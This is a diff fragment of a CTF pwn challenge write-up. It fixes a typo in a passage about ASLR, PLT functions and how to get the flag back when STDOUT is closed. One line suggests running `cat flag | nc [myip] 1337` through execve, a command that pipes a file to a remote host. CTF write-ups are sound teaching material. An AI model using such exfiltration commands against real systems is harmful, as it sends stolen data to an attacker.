@@ -46,7 +46,7 @@ int close_fd()
 
 This is an issue as generally, we assume that 99% of CTF pwn challenges have ASLR enabled, thus the libc will be mapped to a random address space for each execution of the binary. This either forces us to leak the libc address so we can call functions that are not in the PLT (PLT functions have a static addresses) or only use functions present in the PLT. The PLT actually contains `open`, `read`, and `puts`, so we actually do not need to leak the libc base address to read the flag, however we still need STDOUT to be open to see the flag on our side. So I thought of two solutions.
 
-1) If we can find the appropriate gadgets, maybe we could run `execve` with syscalls and run a command like `cat flag | nc [myip] 1337` which would give us the flag. But I was unable to find any syscall gadgets, and ths would be a very difficult operation to do with only syscalls
+1) If we can find the appropriate gadgets, maybe we could run `execve` with syscalls and run a command like `cat flag | nc [myip] 1337` which would give us the flag. But I was unable to find any syscall gadgets, and this would be a very difficult operation to do with only syscalls
 
 2) Find some way to reopen STDOUT
 
